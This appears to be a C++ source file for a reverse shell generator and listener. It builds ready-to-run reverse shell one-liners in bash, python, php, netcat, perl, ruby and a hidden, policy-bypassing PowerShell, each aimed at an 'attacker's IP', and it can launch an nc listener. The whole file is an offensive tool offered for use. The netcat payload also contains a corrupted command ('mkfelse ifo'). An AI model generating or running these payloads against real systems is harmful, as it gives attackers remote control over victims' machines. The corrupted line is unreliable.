#include<iostream>
#include<cstring>
#include<regex>
#include<algorithm>
#include<cctype>
#include<cstdlib>
using namespace std;


#define RESET   "\033[0m"
#define BLACK   "\033[30m"
#define RED     "\033[31m"
#define GREEN   "\033[32m"
#define YELLOW  "\033[33m"
#define BLUE    "\033[34m"
#define MAGENTA "\033[35m"
#define CYAN    "\033[36m"
#define WHITE   "\033[37m"
#define BOLD      "\033[1m"
#define CONCEAL    "\033[8m"
#define BRIGHT_WHITE "\033[97m"


bool isValidIP(const string& ip);
int isValidPort(const int& portnum);
string pwsh(string ip, string port);

void printAsciiArt();
string bash(string ip, string port);
string python(string ip, string port);
string php(string ip, string port);
string netcat(string ip, string port);
string perl(string ip, string port);
string ruby(string ip, string port);
string powershell(string ip, string port);

int main()
{

  printAsciiArt();
  int portnum;

  string n,t,res,listener;
  string ip,port;
  std::cout<< GREEN << "[+]Choose an option from the menu below"<< RESET <<endl;
  cout<< CYAN << "1.python\n2.netcat\n3.bash\n4.php\n5.ruby\n6.perl\n7.powershell"<< RESET <<endl<<endl;
  cout<<"Your Input(in words) : ";
  cin>>n;

  std::transform(n.begin(), n.end(), n.begin(), ::tolower);

  if ((n!="python")&&(n!="netcat")&&(n!="bash")&&(n!="php")&&(n!="ruby")&&(n!="perl")&&(n!="powershell"))
  {
    cout<< RED <<"Invalid Input!\nexiting!"<< RESET <<endl;
    exit(0);
  }

  std::cout<<"Enter attacker's IP : ";
  cin>>ip;
  if (!isValidIP(ip))
  {
    cout<< RED <<"Invalid IP\nexiting!"<< RESET <<endl;
    exit(0);
  }
  std::cout<<"Enter listening port : ";
  cin>>port;

  try {
        portnum = stoi(port);
        if (isValidPort(portnum) != 0) {
            cout << RED << "Invalid Port\nexiting!"<< RESET << endl;
            exit(0);
        }
    } catch (const invalid_argument& e) {
        cout << RED <<"Invalid Port (not a number)\nexiting!" << RESET << endl;
        exit(0);
    } catch (const out_of_range& e) {
        cout << RED << "Invalid Port (out of range)\nexiting!"<< RESET << endl;
        exit(0);
    }


  if (n=="python")
  {
    cout<<"Your python reverse shell is  : "<< BLUE << python(ip,port)<< RESET <<endl<<endl;
  }
  else if (n=="netcat")
  {
    cout<<"Your netcat reverse shell is : "<< MAGENTA <<  netcat(ip,port)<< RESET <<endl<<endl;
  }
  else if (n=="bash")
  {
    cout<<"Your bash reverse shell is : "<< YELLOW << bash(ip,port)<< RESET <<endl<<endl;
  }
  else if (n=="php")
  {
    cout<<"Your php reverse shell is : "<< BOLD << php(ip,port)<< RESET <<endl<<endl;
  }
  else if(n=="ruby")
  {
    cout<<"Your ruby reverse shell is : "<< MAGENTA << ruby(ip,port)<< RESET <<endl<<endl;
  }
  else if(n=="perl")
  {
    cout<<"Your perl reverse shell is : "<< RED << perl(ip,port)<< RESET <<endl<<endl;
  }
  else if(n=="powershell")
  {
    cout<<"Your powershell reverse shell is : "<< CYAN << pwsh(ip,port)<< RESET <<endl<<endl;
  }

cout<< GREEN <<"[+]Do You want to start the listener ?[Y/N]"<< RESET <<endl;
cin>>res;

std::transform(res.begin(), res.end(), res.begin(), ::tolower);
if (res=="y")
{
  cout<< BOLD << "[+]Starting the netcat listener..."<< RESET <<endl;
  listener = "nc -nvlp" + std::to_string(portnum);
  system(listener.c_str());
}


  return 0;
}

int isValidPort(const int& portnum)
{
  if ((portnum<=0)||(portnum>65535))
  {
    return 1;
  }
  return 0;
}

bool isValidIP(const string& ip)
{
  regex ipPattern("^\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}$");
  return regex_match(ip, ipPattern);
}

string bash(string ip,string port)
{

  string shell,s1,s2,s3,s4;
  s1="bash -i >& /dev/tcp/";
  s2=ip + "/" + port;
  s3=" 0>&1";

  s4=s1.append(s2);
  shell=s4.append(s3);
  return shell;
}

string python(string ip, string port)
{

string shell,s1,s2;
s1 = "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"";
s2 = ip + "\", " + port + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")'";
shell = s1 + s2;
return shell;
}

string php(string ip, string port)
{
  string shell,s1,s2,s3;
  s1="php -r '$sock=fsockopen(\"";
  s2=ip + "\"" + "," + port;
  s3=");shell_exec(\"sh <&3 >&3 2>&3\");'";
  shell=s1+s2+s3;
  return shell;
}


string netcat(string ip, string port)
{
  string shell,s1,s2,s3;
  s1="rm /tmp/f;mkfelse ifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ";
  s2=ip + " " + port + " " + ">/tmp/f";
  shell=s1.append(s2);
  return shell ;
}

string perl(string ip, string port)
{
  string shell,s1,s2,s3,s4;
  s1="perl -e 'use Socket;$i=\"";
  s2=ip + "\"" + ";" + "$p=";
  s3=port + ";";
  s4="socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"sh -i\");};'";
  shell=s1+s2+s3+s4;
  return shell;

}

string ruby(string ip, string port)
{
  string shell,s1,s2;
  s1="ruby -rsocket -e'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\"";
  s2=ip + "\"" + "," + port + "))'";
  shell=s1.append(s2);
  return shell;
}

string pwsh(string ip, string port)
{
  string s1,s2,s3,s4;
  s1="powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"";
  s2=ip + "\"" + "," + port;
  s3=");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()";
  s4=s1+s2+s3;
  return s4;
}


void printAsciiArt() {
    string asciiArt = R"(



  _________ ___ ___         .__  .__ __________
 /   _____//   |   \   ____ |  | |  |\______   \____ ______
 \_____  \/    ~    \_/ __ \|  | |  | |     ___/  _ \\____ \
 /        \    Y    /\  ___/|  |_|  |_|    |  (  <_> )  |_> >
/_______  /\___|_  /  \___  >____/____/____|   \____/|   __/
        \/       \/       \/                         |__|

              A reverse shell generator and listener!
              Made with <3 by 5epi0l.




    )";

    cout <<  RED << asciiArt << RESET << endl;
}
